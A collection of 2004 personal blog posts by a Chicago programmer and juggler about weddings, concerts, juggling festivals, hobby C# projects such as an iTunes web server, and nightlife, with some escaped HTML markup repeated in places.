<p>it was a great time. I enjoyed seeing my <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0935.jpg'>family</a> and the <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0983.jpg'>mountains</a>. jon and I got to hang out with some really funny <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0962.jpg'>little kids</a> and got to <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0944.jpg'>meet others</a>. little kids are funny. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0937.jpg'>sarah</a> looked amazing - her <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0954.jpg'>sister</a> designed the dress - it was pretty cool. sarah&#8217;s dad requested I title <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0955.jpg'>this</a> picture: &#8220;birds of a feather.&#8221; heh. sarah&#8217;s mother said to some friends about me: &#8220;i know he doesn&#8217;t look it - but he has a nice job in chicago.&#8221; - we all laughed. I love the kadings. <br /><br />before the wedding we went on the <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A31_sarahs_wedding&amp;img=IMG_0911.jpg'>alpine slide</a>. it was fun. jon hurt himself. ;) jon also crashed the <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1091209345-Nokia6600(222).jpg'>mini</a> <br /><br />it was really <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010820041930/Nokia6600(232).jpg'>hot in colorado</a>. such a different heat than chicago. it was so nice to visit though. I was able to take a couple pictures of some of my very first <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/010820041930/Nokia6600(230).jpg'>art</a> <a href='http://nata2.info/.thumbnails/pictures/misc/phone_camera/nokia_6600/010820041930/Nokia6600(231).jpg'>pieces</a> ;). my parents gave me a DVD player which I <a herf='http://nata2.info/pictures/misc/phone_camera/nokia_6600/020820041456/Nokia6600(237).jpg'>took apart</a> in order to do a no region dvd hack. it wasn&#8217;t successful. but hopefully I will find out info and fully unlock it. I currently have to sporadically choosing which dvds are not in this region. it is pretty funny. <br /><br />so colorado was fun. but the flight back sucked sooo much. first off it was late leaving the boarding cuz the crew was late. then we were delayed 30 minutes cuz of weather. once we got on the flight - three kids in the row behind me started screaming and yelling. and ended up crying most of the flight. it was horrible. we also experienced some of the worst turbulence I have ever been in. it was annoying. then we landed and I had missed my connecting flight. and they were saying it was all weather related. totally a bunch of crap. so they just rebooked my flight and didn&#8217;t give me a hotel or anything. so so so annoying. I was pretty mad. so I played internet. but I wasn&#8217;t able to blog my adventures cuz my site is blocked by their content filter. OHHH. so annoying. then I played 1944 in the arcade until around 12. at which time I got food. and then watched CNN until 1. then I slept very uncomfortably until 5. then I just hung out. so sad. then I finally got on the flight. when I landed in chicago. I coudl barely function. totally totally broken. I couldn&#8217;t really see straight. so I took a sick day and slept until 3ish. stupid sleep. or lack there of. <br /><br />then I played video games in our new awesome air conditioned haven. totally rad. <br /><br />i need food so bad it hurts inside.</p>

I am a fan of head hunter. of course. <br /><br />i remembered again how to use multiple irc servers with scrollz:<blockquote><small>/window new hide<br />[esc 2]<br />/window server irc.whatever.org<br />/join #irule</small></blockquote></p>

<p>this is helpful. <br /><br />i have been workign a lot in c# recently. I really enjoy coding again. for the longest time I was doing a lot of administrative stuff. BORING. haha. but c# relaly gets me going. I love spending time browsing the com objects and seeign what they all do. haha. I am lame. <br /><br />last night morgan and I went shopping for some formalish wear for the wedding this weekend. tonight hiromi and iw ill go and get a tie. I am scared of ties. they seem dumb.</p>

                <p>so my computer broke. so I tested all the parts I could and detirmined that it is the power supply. which totally sucks. so I have to get a new one. this woudln&#8217;t be that big of deal - but my laptop is also down. I somehow broke tcp/ip on it. totally blown. so I am stuck booting knoppix on the laptop and using my desktop keyboard, mouse and monitor with it. it is kinda funny. totally weird. I should bust out qnx. haha. <br /><br />but yea. so tonight I stayed in. cleaned my room. played computer and watched black hawk down. I purchased it back in 2001 and never really watched it. so I finally did tonight. it wasn&#8217;t a bad movie. I am a sucker for war movies. but they are sad. it was a bummer. ok. I think I am going to sleep now. nobody knows.</p>

<p>this weekend was pretty fun. I got my <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1090631339-Nokia6600(186).jpg'>hair severly cut</a> on friday. no more <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1090631429-Nokia6600(187).jpg'>mullet, rattail</a> or <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1090627251-Nokia6600(184).jpg'>peyos</a>. sad day. but is is a nice change. I am happy about it. I also got some color as well so it is all good. I really like it. it did take some getting used to - as I had that haircut for almost 2 years and I had the peyos for like 6 years. so yea. I <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1090848901-Nokia6600(198).jpg'>stretched my head</a> and I am <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/260720041006/Nokia6600(197).jpg'>so mad</a>.<br /><br />then on friday after hanging with severn I met chris and the virgin tears, felix and his friends and family, and claudia for sushi at sushi wabi. it was really fun. we had a lot of really good good sushi. I ate so much. and mid way through the meal we realized that <a href='http://www.imdb.com/name/nm0000191/'>ewan mcgregor</a> and his friends were sitting next to us. they are on a world motorcycle tour filming a TV program called &#8221;<a href='http://www.imdb.com/title/tt0403778/'>long way around</a>.&#8221; apparently ewan and his friend <a href='http://www.imdb.com/name/nm0095564/'>charley boorman</a> are driving 20,000 miles on motorcycles. it seems pretty cool. they have a <a href='http://www.longwayround.com/lwr.htm'>fancy website</a>. but anyway. they are on the final leg of their trip and stopped in chicago for the weekend. we invited them to come to crobar to see felix and charley and the producer <a href='http://www.imdb.com/name/nm1256362/'>david alexanian</a> ended up coming. it was a pretty fun night. chris gave charley a HUGE bottle of champaign and we all just chilled. that was until anna got beat up by crazy girls. it was nuts. I think charley and david were attacked as well. it was really madness. totally insane. well hanging out was good. the beating up was insane. so anyway. charley and david invited me to come to the wrap up party in nyc on thursday. I doubt I can make it. but yea never know. I am supposed to be in colorado then . but maybe I can goto the party and then fly out the next morning. that would be REALLY funny. haha. but yea. I got some good and lame pictures from friday I will post soon. <br /><br />so I slept. and woke up and then I went out with <a href='http://elainepark.com/'>elaine</a>. we went to prince for awhile and then went and saw cex. cex was terrible. I was hoping for his more hip hop stuff - and he was only giving minimal experimental electric stuff. all nonsense. but I got to see make believe and that was nice. &lt;3 them. after that we went to a party at the <a href='http://marvelkind.com/'>marvelkind</a> house - it was a nice time. then sleep. then woke up. yesterday I went to a really fun play at the <a href='http://www.actors-studio.net/'>chicago actors studio</a> with hilary and one of her friends from home. I go to so few plays - it was nice. I saw midsummer nights dream. I was entertained. in retrospect I don&#8217;t really know if it was entirely quality - but it was very entertaining. I laughed. which is fun to do. laughing that is. ;) umm yea. and then I went to <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/260720041006/Nokia6600(189).jpg'>dayra</a> a bit. it was fun - we then left and reassembled at lalos for soem food. all my friends left and I went to soundbar and then big wig. then to sleep. <br /><br />now I am going to do work.</p>

                <p>i am getting my hair done today. I am pretty excited. I am looking forward to a big change. we shall see. <br /><br /></p>

<p>i posted a new versio of the itunesWWW server. check it out <a href='http://www.dopeman.org/itunesWWW.zip'>here</a>. it is still super super super super alpha. so if it breaks everything - sucka you lose. ;) <br /><br />last night was pretty nuts. I went home, changed into tight clothes. went to crobar - got into a <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/230720040230/Nokia6600(179).jpg'>limo bus thing</a>. a <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/230720040230/Nokia6600(180).jpg'>party bus</a>. or van. or whatever. we had a bunch of veuve. I hate veuve - I guess hate is a strong word. I am tired of it. haha. weird. and then we went to <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/230720040230/Nokia6600(165).jpg'>prince</a> where we had three boxes and lots of food and drinks. it ruled. we saw prince. prince was incredible. so so <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/230720040230/Nokia6600(169).jpg'>good</a>. then went back to crobar to disseminate information about our cult. we ruled. hah. the cult of rock. <br /><br />today felix is playing. so it shoudl be dope. we shall see. I hope food is involved.</p>

I also hurt my thumb - which is a bit more concerning. cuz I want it to be happier. but noooo. has to be sad. I hope they all heal appropriately. <br /><br />tomorrow is a big night. I am going to prince, then going to crobar and hanging out with chris. then on friday - felix is spinning so we are all hanging out again. it is gunna be rather fun. <br /><br />the other day I saw <a href='http://nata2.info/pictures/misc/phone_camera/nokia_6600/210720042332/Nokia6600(131).jpg'>these kids playing craps</a> on the train.

I think we will be launching our new application pretty soon. I am excited for it. I want to see peoples reactions. it will be nice I think. ;) whee. hopefully I won&#8217;t get into trouble though. heh.</p>

                <p>i have been away. oh yes. I have been away. <br /><br />i got to buffalo on wednesday night. dylan arrived shortly after I did and we went to the renegade show at this really awesome space called <a href='http://www.spherebuffalo.com/'>sphere</a>. The renegade show was pretty awesome - <a href='http://www.geocities.com/marktheknife2003/photopage.html'>mark faje</a> was really funny as the MC and really made the renegade show what it is &#8220;supposed to be.&#8221; so then we went to our hotel - where we expected to be greated by a multiple room suite - only to find a one room one bed space for 6 men. haha. as you can imagine it ruled. <br /><br />so we woke up and went to the festival. we established our space - check ed in and juggled a bit. met some cool people and waited for the seniors championship show which <a href='http://www.markhayward.net'>mark</a> was mcing. it was pretty amazing. a lot of really great jugglers. <a href='http://sendai.cool.ne.jp/hogono/jugglin/jugglin.htm'>Ryo Yabe</a> RULED the diablo. I have never seen such an act. he did three diablos better than I have ever seen. flawless. I was rather disappointed that he didn&#8217;t place. one of the annoying things for me about these performers was the lack of forethought that was put into the performance aspect of their shows. they almost all had good technique and a unique style - but very few of them really had a show that was entertaining. I was very very disapointed in the tape player style of music that most o f the performers had - and I was annoyed by the &#8220;gym&#8221; atire that some of the people wore. I mean - I don&#8217;t want to see sequined vests or spandex vegas suits - but I would love to imagine that the people who are competing didn&#8217;t just come from the gym. but whatever. we ended up hanging out for a long time - going to another renegade and staying up really late (which was a theme). <br /><br />we got up for friday and arrived at the gym around 2. hung out. got food. juggled a bunch. then we went and watched the <a href='http://www.fkb.com/'>Flying Karamazov Brothers</a>. they were very very funny. I love good drop lines and they had some of the best. so funny. afterwards a bunch of people <a href='http://nata2.info/?path=pictures%2Fjuggling%2Ffestivals%2F2004%3A07%3A18_ija&img=IMG_0806.jpg'>played combat</a>. it was hilarious. I got some good pictures of <a href='http://www.juniorbirdman.com/jaygilligan/'>jay</a> <a href='http://nata2.info/?path=pictures%2Fjuggling%2Ffestivals%2F2004%3A07%3A18_ija&img=IMG_0807.jpg'>beating up</a> little kids and <a href='http://nata2.info/?path=pictures%2Fjuggling%2Ffestivals%2F2004%3A07%3A18_ija&img=IMG_0813.jpg'>emil</a> ruling. it was so funny to watch people of all ages beat the hell out of each other for nothing. hahah. well for glory. heh. dylan and matiss watched the whole time. I did yoyo tricks with this CRAZY yoyo guy. he ruled. so good. a break dancer too. I often find it humorous how related hiphop culture and yoyoing is. I mean - it isn&#8217;t related. but a lot of the yoyoers are interested in making it related. it cracks me up. and loving both of the cultures - I often want them to be one. heh. so nice work. ;) so we left and went to bed. <br /><br />on saturday a lot of meeting cool people occured. I met and hung out a bit with this cool juggler called dorothy. I had heard about her from mark before ija and he said she was cool. and she was. I also hung out with keith nelson of the <a href='http://www.bindlestiff.org/'>bindlestiff family cirkus</a>. some others who were pretty cool were cynthia, terry, vivica, dusty and rod. I am almost positive that I am leaving a bunch of other cats out. but I met so many cool people. and I am entertaining a mild form of sleep dep. so.. I will represent later. or not. it was a lot of fun. late on saturday we had a peeing contest. it was based on distance. it was hilarious. dylan won. it was videoed and photographed. we will make a website soon. it will rule. <br />then sunday came. we were all broken. we hung out and went home. sleep came and went. and now it is today. <br /><br /><a href='http://nata2.info/?path=pictures%2Fjuggling%2Ffestivals%2F2004%3A07%3A18_ija'>here</a> are the pictures I took this weekend. <a href='http://nata2.info/pictures/juggling/festivals/2004%3A07%3A18_ija/ija_sat.jpg'>here</a> is a panorama of the festival on saturday night. rule. I wish I got more pictures. but I was tired of carrying my camera around all the time. I wish I had gotten pictures of my friends. that is the best. heh. <br /><br /> speaking of juggling&#8230; I think <a href='http://thewjf.com/'>this</a> is rediculous - but ithink it will change the face of juggling - and may remove the IJA from the dominant force of north american juggling. and I LOVE the idea of a federation of anything.</p>

WARNING. it is REALLY REALLY rough. but it will be a lot better soon. we are gunna give it the &#8220;treatment.&#8221; basically it is a webserver that listens to a pre desposed port and servers a static page. this page takes from it whatever song is currently playign in itunes and displays it. it also displays some real quick buttons to navigate through the current playlists. it is real real rough ;) soon soon <br /><br />i am off to <a href='http://juggle.org/festival/'>buffalo</a> now. brb. ;)</p>

<p>this weekend was pretty fun. I basically chilled out. I ended up going to redno on friday. which was a surprise for everyone involved. oppenheimer yelled at me for coming. it was hilarious. I ended up staying out too late and then getting up pretty early. which in the long run was nice. I hung out with mark - we drove all over. then we picked up matiss and hiliary and chilled at art and then spiderman 2. I love sam raimi. also on friday I watched <a href='http://imdb.com/title/tt0364385/'>Ju-on:</a> <a href='http://www.juonthegrudge.com/'>The Grudge</a>. it rules and is getting remade and <a href='http://www.sonypictures.com/movies/thegrudge/site/'>released in the U.S. under</a> production from sam raimi and directed by the same dude as the original (Takashi Shimizu). one of the weird things about the movie was how relentlessly spooky it was. it didn&#8217;t really let up. from the beginning to the end it just sent scary pictures to your brain. kind of annoying really. but really scary. <br /><br />we watched this movie with matiss&#8217;s &#8220;friend&#8221; (hahahaha) erica. and it was interesting - cuz matiss and I both have a really good ability to suspend our disbelief - which totally helps us watch and be entertained by scary movies. it rules. <br /><br />so anyway. on saturday we hung out and saw spiderman. then hilary, matiss and myself hung out and ate food and drank margaritas. it was fun. I acutally got a call from an old friend which was quite a surprise - so I hung out with zarth. hehe. a bit. it was nice to see him. he looks liek I would have expected. aged appropriatly and such. like I hope I have. <br /><br />i hate my hair today<br /><br />then we came home. and I slept. then I woke up this morning and we hung out/played video games until 7. then I saw anchorman. but we already covered that. <br /><br /></p>

<p>a friend of mine just told me that <a href='http://www.imdb.com/title/tt0361596/'>fahrenheit 911</a> affected him. it made him think. I am pretty happy about it. although he is sad that he didn&#8217;t think earlier. but that is how it goes. you can&#8217;t win them all. heheh. I often don&#8217;t think. in fact just this afternoon I abandon all responsibilities and goofed off. which is what I needed to do. but I think it is important to note that the potential for thinking is almost as great as thinking itself - cuz I am not worried about my friends. I really feel that they will do and act correctly. but I do think that the more you think about this stuff (this stuff being war and violence and stupid leaders) that you engage more people in discussion. the more you engage people &#8211; the more you will get people to think. the more people think.. well nobody knows what happens once people start thinking. one of the things my friend mentioned was the fact that I commented that I had read/heard a bunch of the stuff michael moore said before. I have kept track of almost ALL of the link I have found that caught my eye on my site <a href='http://war.watership.org'>war.watership.org</a>. if you want to see what has been happening in my mind as well as what has been happening with some small assortment of war links - check it out. it is only a link log. but their are an assload of links(around 2500) collected since 911 (which is when I started keeping track). ok ok. <br /><br />i need to read more books. and I need to watch the virgin suicides or thin red lie or jesus&#8217; son. I have proclaimed those movies to be beautiful. so shut the hell up.<br /><br /> ok yall. you need to help my friend robyn. she is running a marathon(which is apparently a bunch of miles hah I am retarded) and she is a normal person like us - so it is crazy that she is running it. but she is. and she has ran more than I have ever ran just in training. it is quite incredible. but she asked me to post a little thing about her on my blog. so go and support her. check her out <a href='http://aidsmarathon.com/participant.asp?runner=CH-2039'>here</a>. if you don&#8217;t I will be soooo mad. seriously. it is important.</p>
<br />
<p>i should goto sleep.<br />ok. done. but first good music.<br />done. <br />now sleep.</p>

                <p>so I took a break today at work and looked at red/blue 3d pictures with these super fancy three d glasses that a coworker has. it rules. it rules so much I have a bitching headache right now. <br /><br />work is very serious currently. it kinda sucks. I have a so much stuff to do and so little time. and it is all stuff that is fun - but not when the pressure is so high. all I really want to do is play computer right now. I have like 15 sites I want to make - but I am spending a lot of time after work - on work - which totally kills my buzz. haha. so I just endure and hope to be finished. what is crazy is that while I have these software projects going on - I also have been staying up helping with load testing a bit (more moral support than technical) and so I goto bed around 5 and wake up around 10 - coem to work around 11ish and then leave work aroudn 6 or 7 or 8. sad day. lots of work. but that is how it works sometimes. it is funny how much my life is different from my friends - who aren&#8217;t real. <br /><br />not real friends are the best. <br /><br />next week is IJA. w00t. that should be fun. I think I am gunna buy dylan and I matching spandex outfits. it will rule. for sure. hopefully my new <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1088724407-Nokia6600(003).jpg'>yoyo bag</a> will get me mad props. hah. and my giant <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1088017625-Nokia6600(964).jpg'>yoyo</a>.</p>
<br />
<p>i met a bunch <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A04_amjedfest%2Fsaturday&img=IMG_0733.jpg'>of</a> <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A04_amjedfest%2Fsaturday&img=IMG_0705.jpg'>cool</a> <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A04_amjedfest%2Fsaturday&img=IMG_0717.jpg'>people</a> - including this <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A04_amjedfest%2Fsunday&img=IMG_0805.jpg'>insane kid</a> who I got a long with very well and <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A04_amjedfest%2Fsaturday&img=IMG_0740.jpg'>this guy</a> who is apparently in csi. <br />the whole thing was pretty <a href='http://www.nata2.info/?path=pictures%2Fevents%2F2004%3A07%3A04_amjedfest%2Fsunday&img=IMG_0774.jpg'>crazy</a>. I had a bundle of fun. <br /><br />soon I will have a better vocabulary. but not today. and not tomorrow. <br /><br />i need to program and finish this crap so I can go home. <br /><br />i have had Tragedy (For You) in my head for a week. oh and burn in hell. <br /><br />i shoudl be out riding my bike.</p>

                <p>last night I got home from work. went to the mega mall and got my yoyo case. it rules. so insane. haha. I will take a picture. <br /><br />matiss got a cell phone. haha. ;) <br /><br />i rode my bike a bunch yesterday. apparently around 15 miles. I haven&#8217;t rode a bike in years. it was interesting to find myself getting back in to the hang of it. I can now ride for a long time with no hands. it is pretty exciting to be back. I rode to my friends house and we had dinner. it was nuts cuz it was rush hour and everyone wanted to kill me. but I was careful and kept my life. then I rode to crobar. haha. and hung out with claudia and RH matt. we made a dry ice bomb and played around. it ruled. then I rode to juggling club and yoyoed and juggled. we had a bunch of cool people there last night: <a href='http://www.fergieprops.com/'>fergie</a>, <a href='http://incoasterpaedia.com/'>Chris LaReau</a> and <a href='http://www.aetv.com/tv/shows/house_of_dreams/profiles/viveca.jsp'>vivica</a> ( a NYC juggler). a nice time. we all got together afterwards and ate at the golden nugget. hah. rule. I am pretty excited for the IJA. it will be fun. dylan is flying out and we are staying in a hotel room with crash, matt henry, matiss and mark hayward. we are going to roxor. it will be a mess. hopefully we will all return with black eyes from bar fights and strip clubs. <br /><br /></p>

<p>i am sad right now about my lack of words. I only know about ten apparently. I need to do some vocab exercises. it isn;t like I don&#8217;t know the words. I am just unable to use them in this venue - or in any venue where I am attempting to vocalize my thoughts. sad :( <br /><br /></p>

<p>i am really behind at work. it sucks. I wrote this whole program - had it work and was done - and then.. WHAM.. a pretty significant bug appears and destroys all hope. it is rather annoying. I think I have to rearchitect the internals. <br /><br />i have fear. heh. <br /><br />oh yea. I am going to be in nyc this weekend. if anyone wants to &#8220;hang out&#8221; let me know.</p>

                <pre><code>&lt;p&gt;So i have been really busy with a bunch of random and unrelated things. Basically i haven&amp;#8217;t engaged in anything mobile technology at all - which is annoying. i need to play more. &lt;a href=&quot;http://www.therats.org&quot;&gt;matiss&lt;/a&gt; just got a phone with a camera. so i imagine i will be creating a simple way to do a photoblog for him. i hope anyway it will go well. i really need to acquire or figure out how to quickly get a sms gateway. i need it. haha. &lt;/p&gt;
&lt;p&gt;i guess i have been up to the following:&lt;/p&gt;
&lt;ul&gt;&lt;/p&gt;
&lt;li&gt;&lt;a href=&quot;http://www.itunesblogger.com&quot;&gt;itunesblogger.com&lt;/a&gt;: my friend &lt;a href=&quot;http://blog.andrewcarlson.com&quot;&gt;andy&lt;/a&gt; and i were talking about the fancy newish &lt;a href=&quot;http://developer.apple.com/sdk/itunescomsdk.html&quot;&gt;iTunes COM for Windows SDK &lt;/a&gt; that allows developer to write apps that hook into itunes and do fancy things. andy and i had toyed with posting our recently updated songs to the internet and we decided that it woudl be fun to write a c# application that did it very smoothly. so &lt;a href=&quot;http://www.itunesblogger.com/wiki/wakka.php?wakka=HomePage&quot;&gt;we did&lt;/a&gt;. it rules. from the description: &lt;br /&gt;</code></pre>
<br /><blockquote>iTunesBlogger is a utility to track what is being played in iTunes and post information about each track (e.g. track name, artist, etc.) to a web script, or to the clipboard via a hotkey. </blockquote><br />
<p>Awesome. i was also able to get a really good handle on c#. i plan to use it for a bunch of fun utilities. including writing an api that will interface with my <a href='http://www.ambientdevices.com/cat/orb/orborder.html'>ambient orb</a>. then i will be able to do cooler stuff with it. &lt;/li&gt; &lt;/p&gt; &lt;li&gt;<a href='http://www.jokesareawesome.com'>jokesareawesome.com</a>: awhile ago a friend of mine was telling me lots of relaly bad jokes. so we started looking for a joke site that was easy and good. we found a bunch of sites that had bad jokes and a couple sites that had fortune style joke databases. but no site was very good in regards to organization or display. so i grabbed a free joke database and BAM went to town. it is a very simple site and uses some relaly simple/fun dhtml. &lt;li&gt;<a href='http://www.gmail.com'>gmail</a>: although i didn&#8217;t write this ;) i have been playing with it quite a bit. i have ran my own mail service for the last 7 years and haven&#8217;t needed email for that long. so attempting to use another service is insane. i don&#8217;t quite know what i think of it. i don&#8217;t know if i can treat email the same again either. it is a lot like instant messaging. it is pretty wierd. i like it. &lt;/ul&gt; <br /> i guess i should update my webpages. i really need to fix a bunch of stuff. and just make shit tighter. then i can get back on the mobile bandwagan. i am goign to try and get a black berry through work. we will see. ;) &lt;/p&gt;</p>

&lt;li&gt;&lt;a href=&quot;http://www.itunesblogger.com&quot;&gt;itunesblogger.com&lt;/a&gt;: my friend &lt;a href=&quot;http://blog.andrewcarlson.com&quot;&gt;andy&lt;/a&gt; and i were talking about the fancy newish &lt;a href=&quot;http://developer.apple.com/sdk/itunescomsdk.html&quot;&gt;iTunes COM for Windows SDK &lt;/a&gt; that allows developer to write apps that hook into itunes and do fancy things. andy and i had toyed with posting our recently updated songs to the internet and we decided that it woudl be fun to write a c# application that did it very smoothly. so &lt;a href=&quot;http://www.itunesblogger.com/wiki/wakka.php?wakka=HomePage&quot;&gt;we did&lt;/a&gt;. it rules. from the description: 
&lt;blockquote&gt;iTunesBlogger is a utility to track what is being played in iTunes and post information about each track (e.g. track name, artist, etc.) to a web script, or to the clipboard via a hotkey. &lt;/blockquote&gt;
Awesome. i was also able to get a really good handle on c#. i plan to use it for a bunch of fun utilities. including writing an api that will interface with my &lt;a href=&quot;http://www.ambientdevices.com/cat/orb/orborder.html&quot;&gt;ambient orb&lt;/a&gt;. then i will be able to do cooler stuff with it. &lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jokesareawesome.com&quot;&gt;jokesareawesome.com&lt;/a&gt;: awhile ago a friend of mine was telling me lots of relaly bad jokes. so we started looking for a joke site that was easy and good. we found a bunch  of sites that had bad jokes and a couple sites that had fortune style joke databases. but no site was very good in regards to organization or display. so i grabbed a free joke database and BAM went to town. it is a very simple site and uses some relaly simple/fun dhtml. 
&lt;li&gt;&lt;a href=&quot;http://www.gmail.com&quot;&gt;gmail&lt;/a&gt;: although i didn&apos;t write this ;) i have been playing with it quite a bit. i have ran my own mail service for the last 7 years and haven&apos;t needed email for that long. so attempting to use another service is insane. i don&apos;t quite know what i think of it. i don&apos;t know if i can treat email the same again either. it is a lot like instant messaging. it is pretty wierd. i like it. 
&lt;/ul&gt;</pre>
<p>i guess i should update my webpages. i really need to fix a bunch of stuff. and just make shit tighter. then i can get back on the mobile bandwagan. i am goign to try and get a black berry through work. we will see. ;)</p>

                <p>so today over lunch I decided it would be a good idea to import my old email into gmail. it rules. check out the <a href='http://www.marklyon.org/gmail/'>tool</a> that I am using. written by <a href='http://www.marklyon.org/'>mark lyon</a>. it works pretty well - albeit very slow. but whatever. I will just have it go in the background. <br /><br />my server has a <a href='http://nata2.info/?path=pictures%2FIncoming&amp;img=wow_nata2speed.gif'>lot of bandwidth</a>. seriously. <br /><br /><a href='http://nata2.info/humor/movies/dont_ever_get_this_drunk.wmv'>this </a> is pretty bad. <br /><br />i have listened to twisted sister&#8217;s &#8220;burn in hell&#8221; a billion times today and it isn&#8217;t getting very old.</p>

                <p>this weekend was awesome. on thursday I hung out with a dope friend - we got <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1088141512-Nokia6600(973).jpg'>dinner and drinks</a> - it was pretty nice. I went home for a quick stop to say hi to my friends who were staying and then went to crobar - where a bunch of friends were. we somehow made it to vips. hahah. whatever. ;) then I went to bed. I find it pretty weird that I consider thursday the beginning of the weekend. heh. maybe that would explain my oft problematic friday morning. haha. anyway.. after thrusday&#8230; I woke up sick. sad. I got a bit better throughout work and came home so we could leave for sheboygan. wtf.</p>
<br /><br />
<p>&#8217;<a href='http://www.michaelmoore.com/words/latestnews/f911facts/'>Fahrenheit 9/11</a>&#8217; was pretty good. I think it would have been a lot better and more shocking if I hadn&#8217;t been immersing myself in all this nonsense for the past three years. it was infuriating - and I was moved. a lot of it was plain sad and very hard to watch. I did cover my eyes a couple times. I don&#8217;t like to see some of that stuff. it is apparent that bush is an idiot - even though I don&#8217;t really think that him sitting in a school room waiting is indeicative of that. I think a lot more of his actiosn and reactions were more insane than the morning of sept. 11th. but whatever. I thought the movie was quite quite good - and hoepfully good enough to make it to middle america. were these messages are needed the most. go see it. <a href='http://movies.channel.aol.com/showtimes/closesttheaters.adp?&_action=setLocation&exhibitorid=273&_zipcode=60657'>here</a> is where I saw it. <br /><br />ok I need to sleep. or eat. riding bikes is awesome.</p>

                <p>i hate being sick. it totally blows. I love black metal. I really don&#8217;t know how they are related. but I have listened to black metal for the last couple months. and it rules. today was all emporer. <br /><br />i got bored of choosign music for my ipod - so I let itunes do it this time. it did a pretty good job. I am proud. <br /><br />anyway. last night I played yoyo and cleaned my room. it was cool. I got these new bearings for my yoyojam hitmen (:P) and they are <a href='http://www.dif-e-yo.com/konkave.htm'>"konkave"</a> so the string rests on the center and then the yoyo acts very smooth. rico suave. it rules. tricks for years. <br /><br /></p>

<p>check this out. haha. <a href='http://nata2.info'>nata2.info</a> rules. it has an <a href='http://www.alexa.com/data/details/traffic_details?q=&amp;url=nata2.info'>alexa traffic rank</a> of 96,525 and is constantly being blocked by web proxies. haha. my friends told him this: <blockquote>
<small>
The site you requested is blocked under your organization's filtering policy. It fits into the following filtering category(ies) that your organization has chosen to block: <br />
Tasteless/Gross, Jokes, Profanity, Nudity, Sex
</small>
</blockquote> the best part is - that I put all my pictures and such there - so everyone I know &#8220;goes&#8221; there to check stuff out. but they have to wade through pounds and pounds of stuff that is catagorized as &#8220;Tasteless/Gross, Jokes, Profanity, Nudity, Sex.&#8221; I rule. <br /><br />oh oh oh. I remember. I have a new site. it is a pretty cool little site for jokes. most are really bad. but I kept thinkgin to myself - I should write these jokes I have in my head down. and then I was like. naw. I don&#8217;t want to do any of that work. so I made this new site: <br /> <a href='http://jokesareawesome.com/'>http://jokesareawesome.com/</a> <br /> it rules. it took like 2 hours to build. and hopefully the joke library will grow. whee. <br /><br />tonight is crobar rock night. it should be fun. if you want to go - show up and drop my name. haha. so funny. but yea. I am going to dinner with s friend and then to crobar. the sad thing is that I am sick - and that my friend sarah and her fiance matt are in town - but I have to &#8220;work.&#8221; and by work I mean goto a club and be cool. I love my life. programming web apps. fixing servers. makign yoyo sites. yoyoing. clubbing. ladies and finally being awesome. oh yes. it is true. <br /><br />i will probably regret being such a dork at some point. but not now. that is for damn sure. <br /><br />i want my bike.</p>

                <p>i woke up this morning with both a strange sickness in my throat and an feeling that I had lost all ability to type. it was weird. <br /><br />this weekend was pretty good. I basically just hung out with some friends, saw some good shows and all that nonsense. It all started on thrusday. oh yea. crobar. we all hung out. hiromi was drinking a little more than she usually does so that was hilarious. tahmour was there and she did a lot of contact juggling. she is very good. then we went home. went to bed. woke up went to work. I came home and tahmour made me a really nice dinner. I convinced her to add the &#8220;soy riblets&#8221; to the mix - which I don&#8217;t think she really liked. but it ruled anyway. after dinner tahmour and I went to the shins concert at HOB. the shins were really quite amazing in concert. besides not moving much they really represented their music very well. the vocalist was incredible - and they were all pretty funny. I hadn&#8217;t noticed by listening to the music how fast the drums are. it is all double time or something. that guy can move. <br />after the shins we went tand hugn out with jordan a small amount at bin 36. and then we went to the double door for the assassins. the assassins were good. it was nice to see them play after so long. they really know whats up and got their stuff together. I don&#8217;t relaly like how calm they are however. I think it woudl be pretty dope if they hardedged all their songs. not like metal. just a bit harder. more crunchier. <a href='http://www.swampsugar.net'>mary dee</a> was there - so it was nice to see her. as well as <a href='http://www.cynthiaplastercaster.com/'>cynthia</a>. ;) after the assassins show we all headed to a party at some label. it was pretty fun. I was tired. tahmour was disinterested. so we left. heh. <br /><br />on saturday - we hung out and just played around. I really have no real recollection of what I did. I imagine I hung out with friends. like matiss and 